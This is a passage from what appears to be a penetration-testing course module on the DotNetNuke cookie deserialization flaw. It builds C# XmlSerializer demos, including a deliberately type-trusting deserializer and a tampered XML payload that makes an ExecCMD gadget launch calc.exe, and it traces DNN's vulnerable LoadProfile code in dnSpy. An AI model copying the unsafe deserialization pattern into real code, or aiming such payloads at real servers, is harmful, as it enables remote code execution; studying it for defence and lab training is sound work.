This module will cover the in-depth analysis and exploitation of a deserialization remote code execution vulnerability in the DotNetNuke (DNN) platform through the use of maliciously crafted cookies. The primary focus of the module will be directed at the .Net deserialization process, and more specifically at the _XMLSerializer_ class.

Revert the DNN virtual machine from the _Labs_ page. You can log in to the DotNetNuke VM using the following credentials:

|URL|Username|Password|
|---|---|---|
|http://dnn/dotnetnuke|admin|studentlab|
|rdp://dnn|administrator|studentlab|

> Table 1 - Virtual Machine credentials

Please note that the lab VM has been preconfigured to proxy through Burp Suite. After connecting to the lab VM with remote desktop, make sure to start Burp Suite and disable intercept before you browse to the DNN webpage or attempt to connect back to your Kali virtual machine.

The concept of serialization (and deserialization) has existed in computer science for a number of years. Its purpose is to convert a data structure into a format that can be stored or transmitted over a network link for future consumption.

While a deeper discussion of the typical use of serialization (along with its many intricacies) is beyond the scope of this module, it is worth mentioning that serialization on a very high level involves a "producer" and a "consumer" of the serialized object. In other words, an application can define and instantiate an arbitrary object and modify its state in some way. It can then store the state of that object in the appropriate format (for example a binary file) using serialization. As long as the format of the saved file is understood by the "consumer" application, the object can be recreated in the process space of the consumer and further processed as desired.

Due to its extremely useful nature, serialization is supported in many modern programming languages. As it so happens, many useful programming constructs can also be used for more nefarious reasons if they are implemented in an unsafe manner. For example, the topic of deserialization dangers in Java has been discussed exhaustively in the public domain for many years. Similarly, over the course of our penetration testing engagements, we have discovered and exploited numerous deserialization vulnerabilities in applications written in languages such as PHP and Python.

Nevertheless, deserialization as an attack vector in .NET applications has arguably been less discussed than in other languages. It is important to note however that this idea is not new. James Forshaw has expertly discussed this attack vector in his Black Hat 2012 presentation.[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_216-1) More recently, researchers Alvaro Muñoz and Oleksandr Mirosh have expanded upon this earlier research and reported exploitable deserialization vulnerabilities in popular applications as a result of their work.[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_216-2)

One of these vulnerabilities, namely the DotNetNuke cookie deserialization, is the basis for this module.

1

(James Forshaw, 2012), [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_216-1)

2

(Alvaro Muñoz, Oleksandr Mirosh, 2017), [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_216-2)

## 4.1. Serialization Basics

Before we get into the thorough analysis of the vulnerability, we first need to cover some basic concepts in practice. This will help us understand the more complex scenarios later on. There are various formats in which the serialized objects can be stored--we have already suggested a binary format as an option, which in the case of .NET, would likely be handled by the _BinaryFormatter_ class.[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_217-1)

Nevertheless, for the purposes of this module, we will focus on the _XMLSerializer_ class[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_217-2) as it directly relates to the vulnerability we will discuss.

1

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.7.2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_217-1)

2

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_217-2)

### 4.1.1. XmlSerializer Limitations

Before we continue our analysis, we need to highlight some characteristics of the _XmlSerializer_ class. As stated in the official Microsoft documentation,[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_218-1) _XmlSerializer_ is only able to serialize _public_ properties and fields of an object.

Furthermore, the _XmlSerializer_ class supports a narrow set of objects primarily due to the fact that it cannot serialize abstract classes. Finally, the type of the object being serialized always has to be known to the _XmlSerializer_ instance at runtime. Attempting to deserialize object types unknown to the _XmlSerializer_ instance will result in a runtime exception.

We encourage you to read more about the specific capabilities and limitations of _XmlSerializer_. For now however, we just need to keep these limitations in mind as they will play a role later on in our analysis.

1

(Microsoft, 2017), [https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization](https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_218-1)

### 4.1.2. Basic XmlSerializer Example

In our first basic example, we will create two very simple applications. One will create an instance of an object, set one of its properties, and finally serialize it to an XML file through the help of the _XmlSerializer_ class. The other application will read the file in which the serialized object has been stored and deserialize it.

The source code and solution files used in following examples can be found on the DNN VM at **C:\Users\Administrator\source\repos**.

The following listing shows the code for the serializer application.

```
01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: 
05: namespace BasicXMLSerializer
06: {
07:     class Program
08:     {
09:         static void Main(string[] args)
10:         {
11:             MyConsoleText myText = new MyConsoleText();
12:             myText.text = args[0];
13:             MySerializer(myText);
14:         }
15: 
16:         static void MySerializer(MyConsoleText txt)
17:         {
18:             var ser = new XmlSerializer(typeof(MyConsoleText));
19:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\basicXML.txt");
20:             ser.Serialize(writer, txt);
21:             writer.Close();
22:         }
23:     }
24: 
25:     public class MyConsoleText
26:     {
27:         private String _text;
28: 
29:         public String text
30:         {
31:             get { return _text; }
32:             set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
33:         }
34:     }
35: }
```

> Listing 1 - A very basic XmlSerializer application.

There are a couple of points that need to be highlighted in the code from Listing 1. Our namespace contains the implementation of the _MyConsoleText_ class starting on line 25. This class prints out a sentence to the console containing the string that is stored in its private "_text" property when its public counterpart is set.

On lines 11-12, we create an instance of the _MyConsoleText_ class and set its "text" property to the string that will be passed on the command line. Finally, on line 18 we create an instance of the _XmlSerializer_ class and on line 20, we serialize our _myText_ object and save it in the C:\Users\Public\basicXML.txt file.

Let's now take a quick look at the deserializer application.

```
01: using System.IO;
02: using System.Xml.Serialization;
03: using BasicXMLSerializer;
04: 
05: namespace BasicXMLDeserializer
06: {
07:     class Program
08:     {
09:         static void Main(string[] args)
10:         {
11:             var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);
12:             var streamReader = new StreamReader(fileStream);
13:             XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
14:             serializer.Deserialize(streamReader);
15:         }
16:     }
17: }
```

> Listing 2 - A very basic deserializing application

Our deserializer application simply creates an instance of the _XmlSerializer_ class using the _MyConsoleText_ object type and then deserializes the contents of our input file into an instance of the original object. It is important to remember that the _XmlSerializer_ has to know the type of the object it will deserialize. Considering that this application does not have the _MyConsoleText_ class defined in its own namespace, we need to reference the _BasicXMLSerializer_ assembly in our Visual Studio project (Figure 1).

![Figure 1: A reference to the BasicXMLSerializer executable has to be present in our deserializer project](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/1f60bce780b5ec4c5259599800bae4b2-Picture3.png)

Figure 1: A reference to the BasicXMLSerializer executable has to be present in our deserializer project

To add a reference to the desired executable file, we can use the _Project_ menu in Visual Studio and use the _Add Reference_ option. This will bring up a dialog box, which we can use to browse to our target executable file and add it to our project as a reference. The _BasicXMLSerializer_ namespace can then be "used" in our example code as shown on line 3 of Listing 2.

Before testing our applications we need to compile them. To do so we can use the _Build_ > _Build Solution_ menu option in Visual Studio.

![Figure 2: Compiling the application source code](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/7c21d9eaa5a2d5abba2410e61896d98e-Picture3a.png)

Figure 2: Compiling the application source code

Once the compilation process is completed, we'll first run our serializer application, passing a string to it at the command line.

```
C:\Users\Administrator\source\repos\BasicXMLSerializer\BasicXMLSerializer\bin\x64\Debug>BasicXMLSerializer.exe "Hello AWAE"
My first console text class says: Hello AWAE
```

> Listing 3 - Basic serialization of user-defined text

After running the application, our serialized object looks like the following:

```
<?xml version="1.0" encoding="utf-8"?>
<MyConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <text>Hello AWAE</text>
</MyConsoleText>
```

> Listing 4 - Our serialized object as stored in basicXML.txt

Finally, we deserialize our object by running BasicXMLDeserializer.exe while passing the filename generated by BasicXMLSerializer.exe.

```
C:\Users\Administrator\source\repos\BasicXMLDeserializer\BasicXMLDeserializer\bin\x64\Debug>BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"
My first console text class says: Hello AWAE
```

> Listing 5 - Basic deserialization of an object containing user-defined text

The "Hello AWAE" output in Listing 5 is the result of the execution of the code present in the _MyConsoleText_ setter method. Notice how the setter of our property was automatically executed during the deserialization of the target object. This is an important concept for an attacker. In some cases, by using object properties the setters can trigger the execution of additional code during deserialization.

In this case, another interesting aspect is that we would be able to manually change the contents of basicXML.txt in a trivial way, since the serialized object is written in XML format. We could for example change the content of the "text" tag (Listing 4) and have a string of our choice displayed in the console once the object is deserialized.

This previous example is very basic in nature, but it demonstrates exactly how XML serialization works in .NET. Now let's expand upon our example scenario.

#### Exercise

Repeat the steps outlined in the previous section and make sure that you can compile and execute the Visual Studio solutions.

### 4.1.3. Expanded XmlSerializer Example

Our previous example was rather rigid in that it could only deserialize an object of the type _MyConsoleText_, because that was hardcoded in the _XmlSerializer_ constructor call.

```
XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
```

> Listing 6 - Our XmlSerializer example could only handle a single type

As that seems rather limiting, a developer could decide to make the custom deserializing wrapper a bit more flexible. This would provide the application with the ability to deserialize multiple types of objects. Let's examine one possible way of how this would look in practice. Note that the following examples borrow heavily from the DNN code base in order to streamline our analysis.

Our new serializing application now looks like this:

```
01: using System;
02: using System.IO;
03: using System.Xml;
04: using System.Xml.Serialization;
05: 
06: namespace MultiXMLSerializer
07: {
08:     class Program
09:     {
10:         static void Main(string[] args)
11:         {
12:             String txt = args[0];
13:             int myClass = Int32.Parse(args[1]);
14: 
15:             if (myClass == 1)
16:             {
17:                 MyFirstConsoleText myText = new MyFirstConsoleText();
18:                 myText.text = txt;
19:                 CustomSerializer(myText);
20:             }
21:             else
22:             {
23:                 MySecondConsoleText myText = new MySecondConsoleText();
24:                 myText.text = txt;
25:                 CustomSerializer(myText);
26:             }
27:         }
28: 
29:         static void CustomSerializer(Object myObj)
30:         {
31:             XmlDocument xmlDocument = new XmlDocument();
32:             XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
33:             xmlDocument.AppendChild(xmlElement);
34:             XmlElement xmlElement2 = xmlDocument.CreateElement("item");
35:             xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
36:             XmlDocument xmlDocument2 = new XmlDocument();
37:             XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
38:             StringWriter writer = new StringWriter();
39:             xmlSerializer.Serialize(writer, myObj);
40:             xmlDocument2.LoadXml(writer.ToString());
41:             xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
42:             xmlElement.AppendChild(xmlElement2);
43: 
44:             File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
45:         }
46:     }
47: 
48:     public class MyFirstConsoleText
49:     {
50:         private String _text;
51: 
52:         public String text
53:         {
54:             get { return _text; }
55:             set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
56:         }
57:     }
58: 
59:     public class MySecondConsoleText
60:     {
61:         private String _text;
62: 
63:         public String text
64:         {
65:             get { return _text; }
66:             set { _text = value; Console.WriteLine("My second console text class says: " + _text); }
67:         }
68:     }
69: }
```

> Listing 7 - A more versatile XmlSerializer use-case.

The idea here is very similar to our basic example. Rather than serializing a single type of an object, we have given our application the ability to serialize an additional class, namely _MySecondConsoleText_, which we have defined starting on line 59. We can see the instantiation of our two classes on lines 17 and 23 respectively, which is based on the user-controlled argument passed on the command line.

The most interesting parts of this application are found in the _CustomSerializer_ function starting on line 29. Specifically, we have decided to pass the information about the type of the object being serialized in a custom XML tag called "item". This can be seen on line 35. Furthermore, notice that on line 37, we are not hardcoding the type of the object we are serializing during the instantiation of the _XmlSerializer_ class. Instead, we are using the _GetType_ function on the object in order to dynamically retrieve that information.

The serialized object is then wrapped inside a custom-created XML document and written to disk.

Let's now look at how the deserializer application will handle these objects.

```
01: using System;
02: using System.Diagnostics;
03: using System.IO;
04: using System.Xml;
05: using System.Xml.Serialization;
06: 
07: namespace MultiXMLDeserializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             String xml = File.ReadAllText(args[0]);
14:             CustomDeserializer(xml);            
15:         }
16: 
17:         static void CustomDeserializer(String myXMLString)
18:         {
19:             XmlDocument xmlDocument = new XmlDocument();
20:             xmlDocument.LoadXml(myXMLString);
21:             foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
22:             {
23:                 string typeName = xmlItem.GetAttribute("objectType");
24:                 var xser = new XmlSerializer(Type.GetType(typeName));
25:                 var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
26:                 xser.Deserialize(reader);
27:             }
28:         }
29:     }
30: }
```

> Listing 8 - A more versatile deserializer use-case

Our new serializer example now has two different serializable classes so our new deserializer application has to be aware of those classes in order to properly process the serialized objects. Since we are not directly instantiating instances of those classes, there is no need to include the `using MultiXMLSerializer;` directive. Nevertheless, we still need to have a reference to this executable in our Visual Studio project.

![Figure 3: A reference to an executuable with the target class definitions is required](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/ebddd87f3d06c9f6c9e66492b9290927-Picture2.png)

Figure 3: A reference to an executuable with the target class definitions is required

However, the most interesting part in our new application can be seen on lines 23-24 (Listing 8). Specifically, our application now dynamically gathers the information about the type of the serialized object from the XML file and uses that to properly construct the appropriate _XmlSerializer_ instance.

Let's see that in practice.

```
C:\Users\Administrator\source\repos\MultiXMLSerializer\MultiXMLSerializer\bin\x64\Debug>MultiXMLSerializer.exe "Serializing first class..." 1
My first console text class says: Serializing first class...
```

> Listing 9 - Serialization of the first example class

This is what our resulting XML file looks like (pay attention to the "item" node):

```
<customRootNode>
<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MyFirstConsoleText>
</item>
</customRootNode>
```

> Listing 10 - The resulting XML file contents

And finally, let's see what happens when we deserialize this object.

```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My first console text class says: Serializing first class...
```

> Listing 11 - Deserialization of the first example class

At this point, it is critical to understand the following: it is possible to change the contents of the serialized object file, so that rather than deserializing the _MyFirstConsoleClass_ instance, we can deserialize an instance of _MySecondConsoleClass_. In order to accomplish that, our XML file contents should look like this:

```
<customRootNode>
<item objectType="MultiXMLSerializer.MySecondConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MySecondConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MySecondConsoleText>
</item>
</customRootNode>
```

> Listing 12 - Manually modified XML file contents

If we deserialize this object, we get the following result:

```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My second console text class says: Serializing first class...
```

> Listing 13 - Deserialization of the second example class

It is important to state that this manipulation is possible because we can easily determine the object information we need from the source code in order to successfully control the deserialization process. However, in cases where we only have access to compiled .NET modules, decompilation can be achieved through publicly available tools as we have already seen at the beginning of this course.

#### Exercise

Repeat the steps outlined in the previous section. Make sure you fully understand how we are able to induce the deserialization of a different object type.

### 4.1.4. Watch your Type, Dude

Finally, let's complete our example by demonstrating how a deserialization implementation such as the previous one can be misused. Consider the following change to our _MultiXMLDeserializer_ application:

```
01: using System;
02: using System.Diagnostics;
03: using System.IO;
04: using System.Xml;
05: using System.Xml.Serialization;
06: 
07: namespace MultiXMLDeserializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             String xml = File.ReadAllText(args[0]);
14:             CustomDeserializer(xml);            
15:         }
16: 
17:         static void CustomDeserializer(String myXMLString)
18:         {
19:             XmlDocument xmlDocument = new XmlDocument();
20:             xmlDocument.LoadXml(myXMLString);
21:             foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
22:             {
23:                 string typeName = xmlItem.GetAttribute("objectType");
24:                 var xser = new XmlSerializer(Type.GetType(typeName));
25:                 var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
26:                 xser.Deserialize(reader);
27:             }
28:         }
29:     }
30: 
31:     public class ExecCMD
32:     {
33:         private String _cmd;
34:         public String cmd
35:         {
36:             get { return _cmd; }
37:             set
38:             {
39:                 _cmd = value;
40:                 ExecCommand();
41:             }
42:         }
43: 
44:         private void ExecCommand()
45:         {
46:             Process myProcess = new Process();
47:             myProcess.StartInfo.FileName = _cmd;
48:             myProcess.Start();
49:             myProcess.Dispose();
50:         }
51:     }
52: }
```

> Listing 14 - Deserialization application implements an additional class

Our new version of the deserializer application also implements the _ExecCMD_ class. As the name suggests, this class will simply create a new process based on its "cmd" property. We can see how this is accomplished starting on line 37. Specifically, the _cmd_ property setter sets the private property __cmd_ based on the value that has been passed and immediately makes a call to the _ExecCommand_ function. The implementation of this function can be seen starting on line 44.

Based on everything we discussed up to this point, it should be clear what our next step would be as an attacker. We already know that we can manually manipulate the content of a properly serialized object file in order to trigger the deserialization of an object type that falls within the parameters of the _XmlSerializer_ limitations. In our trivial example, the _ExecCMD_ class does not violate any of those constraints. Therefore we can change the XML file to look like this:

```
<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>calc.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```

> Listing 15 - Manipulation of the XML file to target an unintended object type

Please notice that we have changed the object type to _ExecCMD_ and that we have also renamed the _text_ tag to _cmd_. This corresponds to the public property name we previously saw in the _ExecCMD_ class. Finally, we set that tag value to the process name we would like to initiate, in this case calc.exe. If we execute our deserializer application again, we should see the following result:

![Figure 4: Deserialization of the ExecCMD object](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/3e8bfaa72eb15d3a48dc5291f8e99642-Picture1.png)

Figure 4: Deserialization of the ExecCMD object

As we can see once again in our rather trivial example, as long as we are able to retrieve the class information we need and the target class can be deserialized by the _XmlSerializer_, we can instantiate objects that the original developers likely never intended to be deserialized. This is possible because in the code we have examined so far, there is no object type verification implemented before a user-supplied input is processed by _XmlSerializer_.

In some real-world cases, this type of vulnerability can have critical consequences. We will now look in detail at such a case involving the DotNetNuke platform.

#### Exercise

Repeat the steps outlined in the previous section. Deserialize an object that will spawn a Notepad.exe instance.

## 4.2. DotNetNuke Vulnerability Analysis

Now that we have some basic knowledge of _XmlSerializer_, we can start analyzing the actual DotNetNuke vulnerability that was discovered by Muñoz and Mirosh.

As reported, the vulnerability was found in the processing of the _DNNPersonalization_ cookie, which as the name implies, is directly related to a user profile. Interestingly, this vulnerability can be triggered without any authentication.

### 4.2.1. Vulnerability Overview

The entry point for this vulnerability is found in the function called _LoadProfile_, which is implemented in the DotNetNuke.dll module. Although the source code for DNN is publicly available, for our analysis we will use the _dnSpy_ debugger, as we will need it later on in order to trace the execution of our target program.

Again, in this case we would be able to use the official source code for the DNN platform as it is publicly available, but in most real-life scenarios that is not the case. Therefore, using dnSpy for decompilation as well as debugging purposes will help us get more familiar with the typical workflow in these situations.

To get started, we will need to use the x64 version of dnSpy since the w3wp.exe process that we will be debugging later on is a 64-bit process. In order to decompile our DotNetNuke.dll file, we can simply browse to it using the dnSpy _File_ > _Open_ menu or by dragging it from the File Explorer onto the dnSpy window.

![Figure 5: Decompilation of DotNetNuke.dll](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/52b8a6bed8248ff6276ca08a7fd4f9d3-Picture12b.png)

Figure 5: Decompilation of DotNetNuke.dll

We can now navigate to our target _LoadProfile_ function located in the _DotNetNuke.Services.Personalization.PersonalizationController_ namespace.

![Figure 6: Navigating to the LoadProfile function](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/1bb95b5a1eda583c47acedcd2aa179bc-Picture12a.png)

Figure 6: Navigating to the LoadProfile function

![Figure 7: The entry point for our DNN vulnerability](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/6cd656cb021e626c072d8ab34429b3cb-Picture4.png)

Figure 7: The entry point for our DNN vulnerability

In Figure 7 we can see the implementation of the _LoadProfile_ function shown in dnSpy. It is important to note that, as indicated in Muñoz and Mirosh presentation,[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_223-1) this function can be triggered any time we visit a nonexistent page within the DNN web application. We will be able to confirm this later on.

At line 24, the function checks for the presence of the "DNNPersonalization" cookie in the incoming HTTP request. If the cookie is present, its value is assigned to the local _text_ string variable on line 26. Then, on line 29, this variable is passed as the argument to the _DeserializeHashTableXml_ function.

If we follow this execution path, we will see the following implementation of the _DeserializeHashTableXml_ function:

![Figure 8: DeserializeHashTableXml function implementation](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/54b9c9085d8ab9f589ac64b28630b058-Picture5.png)

Figure 8: DeserializeHashTableXml function implementation

Figure 8 shows that _DeserializeHashTableXml_ acts as a wrapper for the _DeSerializeHashtable_ function. Take note that the second argument passed in this function call on line 2461 is the hardcoded string "profile". This will be important later on in our exploit development.

Continuing to follow the execution path, we arrive at the implementation of the _DeSerializeHashtable_ function.

![Figure 9: Implementation of the DeSerializeHashtable function](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/19e8e34e2b068e6d68883a2224c064d5-Picture6.png)

Figure 9: Implementation of the DeSerializeHashtable function

As we mentioned in our basic _XmlSerializer_ examples, we had borrowed heavily from the DNN code base to demonstrate some of the pitfalls of deserialization. Therefore, the structure of the _DeSerializeHashtable_ function shown in Figure 9 should look very familiar. Essentially, this function is responsible for the processing of the DNNPersonalization XML cookie using the following steps:

- look for every _item_ node under the _profile_ root XML tag (line 156)
- extract the serialized object type information from the _item_ node "type" attribute (line 160)
- create a _XmlSerializer_ instance based on the extracted object type information (line 161)
- deserialize the user-controlled serialized object (line 163)

Since it appears that no type checking is performed on the input object during deserialization, this certainly seems very exciting from the attacker perspective. However, to continue our analysis, we need to take a quick break and set up our debugging environment so that we can properly follow the execution flow of the target application while processing our malicious cookie values.

1

(Alvaro Muñoz, Oleksandr Mirosh, 2017), [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_223-1)

### 4.2.2. Manipulation of Assembly Attributes for Debugging

Debugging .NET web applications can sometimes be a bit tricky due to the optimizations that are applied to the executables at runtime. One of the ways these optimizations manifest themselves in a debugging session is by preventing us from setting breakpoints at arbitrary code lines. In other words, the debugger is unable to bind the breakpoints to the exact lines of code we would like to break at. As a consequence of this, in addition to not being able to break where we want, at times we are also not able to view the values of local variables that exist at that point. This can make debugging .NET applications harder than we would like.

Fortunately, there is a way to modify how a target executable is optimized at runtime.[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_224-1) More specifically, most software will be compiled and released in the Release version, rather than Debug. As a consequence, one of the assembly attributes would look like this:

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
```

> Listing 16 - Release versions of .NET assemblies are optimized at runtime

In order to enable a better debugging experience, i.e. to reduce the amount of optimization performed at runtime, we can change that attribute,[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_224-2),[3](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_224-3) to resemble the following:

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

> Listing 17 - Specific assembly attributes can control the amount of optimization applied at runtime

As it so happens, this can be accomplished trivially using dnSpy. However, we need to make sure that we modify the correct assembly before we start debugging. In this instance, our target is the C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll file. It is important to note that once the IIS worker process starts, it will NOT load the assemblies from this directory. Rather it will make copies of all the required files for DNN to function and will load them from the following directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\.

As always, before we do anything we should make a backup of the file(s) we intend to manipulate. We can then open the target assembly in dnSpy, right-click on its name in the Assembly Explorer and select the _Edit Assembly Attributes (C#)_ option from the context menu (Figure 10). The same option can also be accessed through the _Edit_ menu.

![Figure 10: Accessing the Edit Assembly Attributes menu](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/98dc5ab0f81f888b8ea193dcaf4bda47-Picture41.png)

Figure 10: Accessing the Edit Assembly Attributes menu

Clicking on that option opens an editor for the assembly attributes.

![Figure 11: Assembly attributes](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/cf6f17b2c23dd05c2b41f638932736c6-Picture42.png)

Figure 11: Assembly attributes

Here we need to replace the attribute we mentioned in Listing 16 (line 11) to the contents found in Listing 17.

![Figure 12: Editing the assembly attributes](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/bd0bc1c3c5a54f0bd9cfdcde02466776-Picture43.png)

Figure 12: Editing the assembly attributes

Once we replace the relevant assembly attribute, we can just click on the _Compile_ button, which will close the edit window. Finally, we'll save our edited assembly by clicking on the _File_ > _Save Module_ menu option, which presents us with the following dialog box:

![Figure 13: Saving the edited assembly](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/be7c1faee9d546eadb07d27020fa4dae-Picture44.png)

Figure 13: Saving the edited assembly

We can accept the defaults and have the edited assembly overwrite the original. At this point we are ready to start using our dnSpy debugger.

#### Exercise

Change the attributes of DotNetNuke.dll and make sure you can properly recompile and save the assembly.

1

(dnSpy, 2019), [https://github.com/0xd4d/dnSpy/wiki/Making-an-Image-Easier-to-Debug](https://github.com/0xd4d/dnSpy/wiki/Making-an-Image-Easier-to-Debug) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_224-1)

2

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debuggableattribute.debuggingmodes?redirectedfrom=MSDN&view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debuggableattribute.debuggingmodes?redirectedfrom=MSDN&view=netframework-4.7.2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_224-2)

3

(Rick Byers, 2005), [https://blogs.msdn.microsoft.com/rmbyers/2005/09/08/debuggingmodes-ignoresymbolstoresequencepoints/](https://blogs.msdn.microsoft.com/rmbyers/2005/09/08/debuggingmodes-ignoresymbolstoresequencepoints/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_224-3)

### 4.2.3. Debugging DotNetNuke Using dnSpy

As we did in earlier modules, we will once again rely on our Burp proxy to precisely control our payloads. Please note that the web browser proxy settings on your lab VM have already been set. Therefore, make sure that BurpSuite is already running before you browse to the DNN webpage.

